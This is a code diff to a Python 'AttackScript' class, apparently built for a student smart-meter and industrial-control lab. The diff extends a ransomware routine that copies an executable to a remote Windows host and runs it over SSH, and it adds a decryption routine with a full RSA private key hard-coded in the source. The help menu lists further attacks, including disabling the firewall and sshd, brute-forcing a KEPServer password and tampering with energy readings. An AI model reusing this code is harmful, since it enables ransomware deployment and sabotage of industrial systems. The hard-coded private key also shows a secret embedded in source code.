@@ -388,15 +388,69 @@ class AttackScript:
             print(disableCOM)
             raise Exception(f"Device not {enable_or_disable.split('-')[0][1:]}d. \nFail.\n")
         
-    def Ransom(self) -> None:
+    def Ransom(self, revert: bool=False) -> None:
 
-        output = self.transfer_exe_remotely("C:\\Users\\Student\\Documents\\")
-        print(output)
         executable_name = path.basename(__file__).rsplit(".", 1)[0] + ".exe"
 
+        if revert:
+            decrypt = ""
+            decrypt = self.ssh_run_command("C:\\Users\\Student\\Documents\\" + executable_name + " 32")
+            print(decrypt)
+
+        # checkEXE = self.ssh_run_command("dir C:\\Users\\Student\\Documents")
+        # if executable_name in checkEXE:
+        #     print("Executable already in documents folder")
+        # else:
+        output = self.transfer_exe_remotely("C:\\Users\\Student\\Documents\\")
+        print(output)
         run_exe = self.ssh_run_command("C:\\Users\\Student\\Documents\\" + executable_name + " 30")
         print(run_exe)
-        
+
+    def revert_decrypt(self) -> None:
+        privatekey = '''-----BEGIN RSA PRIVATE KEY-----
+    MIIEpQIBAAKCAQEAqNoTOZSFB9J10UawmCFFSXDKxMmPTPL1JBerClFnB402MnPm
+    IW5YzzIz8KoQsbsMxP+pxI+xO2f3o7umQSF0+JvtE6TKsdW7rBO2E75EzFsQttBg
+    rdKa9rN/fUWwpQsEtPp/Rgk/W4CQqfsPVKApNqPXN7JYG62t/V5ZO3I1QbjGIBxP
+    QuSfk88Hkyy6GXXMT8tZOjGPsLS/pMY0iQ/SzEHv3dQc2WggIcqAmAJOEVKjrLPG
+    bU/tr35l805HlwhktfQulA+AGrKObXt7O+W/LOSmHoegIrNhvmDk/PTmDamc7aMB
+    0i6adb+G1D1NRsDWdL2KtdoIg0eFBOhCBmADnwIDAQABAoIBABk+xaoRvRQO0OOx
+    vHx6WPgif4aNljnMh39WdJGt2wgjgktnzawI6glMebyNSMKx8zZO/UxwqXB22m0m
+    BLTvMiRrd7Y8qLuO96jCJ7Jq+7FMGkMjA5lpiBbDfpe1wDPk4lbGrxnDDzB4l+h6
+    K3AdJBxRwb9HkGnO/VkI7rF3IWRKZBXLAWu5GbVSpTlcx0qdegChPUak7vClfuTc
+    eA6CaNIzM80PBtXHlD5vfn0TFaYnG+mWSQvAipWUCM0LZTzmXyLri9nvopE56Ctk
+    wzx0phibpzs9TED4Bl+MhyFvAB/+IG/fyVgDpJFGPpjANCkQy1DImL/JY2ptzy+R
+    pnL8iGUCgYEAviOpOmnSJjq/h5Kxs/C8tqobHqPCJk2za22WG+6CJeHrDiV6fvJu
+    2LnZqV7vM17eSZi2lRh7bPyszVr5U2HiGehwdwCsVOnB83r7pZ8JB8EGHvVSNkXG
+    J3KlnldFhQDnC9HkA8yW5iv5eZ2pFwO4M5xRMggFwvXltfqwLuwDFnUCgYEA41bH
+    hDtpW/vYXzneA13HX2Y/P1vXVylVLkVJY37pmxTLU8gHyqLChGyIZvgH6pQ7hm+H
+    67C6Q1MJPEnKZeOef8DkAxg9n/riifUMZ4XzyOgD/1vGjybKu1vJ8PduagZC0spN
+    2JMlYsacWBd7CpxPGi0JOMgb2lWH6ULQLq0GN0MCgYEAhy2RRZ8wMc+4lWk8f2Ja
+    uD7tsvXXtSWutmSdwNProYUheNg6Y4B2QAy5a4m747jBrm8s94kFTvHA5OqVsas4
+    dRTkyCYpXuEl67V2rUQIxoN7l4zv2vf2Ldt7VbxUB4AhwyyAwBa2/YMsBUOKkHsr
+    fT3YGArOFdJ+csd8dI+EjnUCgYEAvaEDJ4+PIMUABN52DATLaw4Ur7rh8rhtbv0o
+    bC/OmCdOOwJdTW9aJa+KT6mQoOEojci2baiqlcHLsFg01ax550J0bwhnTuyszjpz
+    MF8RrIGr4/MfuwS2knXMCo25sgKq9rz9FiwXQT895lUfswgTC1iJmq2AXix+A9pR
+    YL2+s5UCgYEAtm75K4aS+31qeY5NTylL8vhfOXa7OE/tB+lMfAJZJa3EVJkaaLOJ
+    QTcMyRL6qY785tS6gL3dktGIYa2s7KfgivBtjmM+ZeFa6ySY7/Kizchobxo/wA9A
+    zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
+    -----END RSA PRIVATE KEY-----'''
+
+        # exclude extensions
+        excludeExtension = ['.py', '.pem', '.exe']
+
+        try:
+            for item in self.recurseFiles(self.SMARTMETER_PATH):
+                filePath = Path(item)
+                fileType = filePath.suffix.lower()
+
+                if fileType in excludeExtension:
+                    continue
+                self.decrypt(filePath, privatekey)
+            print("Decryption Successful.\nOk.\n")
+        except Exception as e:
+            print("Decryption Failed.\nFail.\n")
+            return
+
 
     def encrypt_files(self) -> None:
         # public key
@@ -1945,6 +1999,7 @@ class AttackScript:
             case "29": self.kep_get_log_group("Derrick")
             case "30": self.encrypt_files()
             case "31": self.Ransom()
+            case "32": self.revert_decrypt()
             case "-h":
                 print(
                     "\nChoose \n1 Delete file, \n2 Copy file, \n3 Disable firewall, \n4 Disable ssh through firewall, \n5 Disable Kepserver, \n6 Interrupt modbus reading, \n7 Disable COMPORT, \n8 Encrypt files, \n9 Change Meter25 Id to 26, \n10 Clear Energy Reading, \n11 Revert with options, \n12 Bruteforce KEPServer Password, \n13 Disable sshd Service.")
